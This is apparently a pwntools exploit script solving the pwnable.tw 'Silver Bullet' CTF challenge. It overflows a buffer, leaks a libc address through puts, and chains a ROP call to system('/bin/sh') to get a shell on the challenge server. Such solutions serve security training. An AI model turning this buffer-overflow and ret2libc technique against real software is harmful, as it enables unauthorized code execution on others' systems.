#Exploit for pwnable.tw/Silver Bullet
from pwn import *
target = remote('chall.pwnable.tw', 10103)
#target = process('./silver_bullet')
elf = ELF('./silver_bullet')
libc = ELF('./libc_32.so.6')

def create_bullet(d):
	target.sendlineafter(' :', '1')
	target.sendafter(' :', d)

def power_up(d):
	target.sendlineafter(' :', '2')
	target.sendafter(' :', d)

def beat():
	target.sendlineafter(' :', '3')

def attack(rop):	
	create_bullet("A"*0x2f)
	power_up("A")
	power_up("\xff"*7 + rop)
	beat()

payload = p32(elf.plt['puts']) + p32(elf.sym['main']) + p32(elf.got['puts'])
attack(payload)
target.recvuntil("Oh ! You win !!\n")
libc_base = u32(target.recv(4)) - libc.sym['puts']
log.info("LIBC Base: " + hex(libc_base))

payload = p32(libc_base + libc.sym['system']) + p32(elf.plt['exit']) + p32(libc_base + libc.search("/bin/sh\x00").next())
attack(payload)
target.recvuntil("Try to beat it .....\n")

target.interactive()
